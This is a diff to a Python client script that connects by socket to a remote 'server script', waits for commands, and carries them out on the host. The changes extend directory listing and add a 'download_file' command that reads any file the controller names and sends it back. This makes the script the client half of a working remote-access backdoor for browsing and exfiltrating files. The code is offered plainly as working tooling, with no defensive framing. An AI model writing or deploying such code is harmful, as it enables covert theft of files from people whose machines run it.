@@ -19,21 +19,36 @@ while True:
     command = command.decode() #decode command
     print("\nCommand received") 
     if command == "getcwd":
-        files = os.getcwd() #get actual directory
-        files = str(files) 
-        s.send(files.encode()) #send the info encoded to server script
+        directory = str(os.getcwd()) #get actual directory        
+        files = str(os.listdir(directory)) #get files for the actual directory
+        s.send(directory.encode()) #send the info encoded to server script
+        s.send(files.encode())
         print("\nCommand has been executed successfully...")
+
     elif command == "custom_dir":
         try:
-            userInput = s.recv(5000)
+            userInput = s.recv(5000) #receive instruction
             userInput = userInput.decode()
-            files = os.listdir(userInput)
-            files = str(files)
+            files = str(os.listdir(userInput)) #get files of the directory
             s.send(files.encode())
             print("\nCommand has been executed succesfully...")
         except Exception as e:
             error = str("Path not found, try again")
             s.send(error.encode())
             print("\nError has been sent")
+
+    elif command == 'download_file':
+        try:
+            userInput = s.recv(5000) #receive the instruccion
+            userInput = userInput.decode()
+            file = open(userInput, 'rb') #open the file especified as readable file
+            fileName = str(os.path.basename(file.name)) #get name of the file with extension
+            s.send(fileName.encode()) #send file name
+            data = file.read() #copy info to data var
+            s.send(data) #send info
+            print("\nFile has been sent successfully")
+        except Exception as e:
+            print("error try again")                        
+
     else:
         print("\nCommand not recognised")
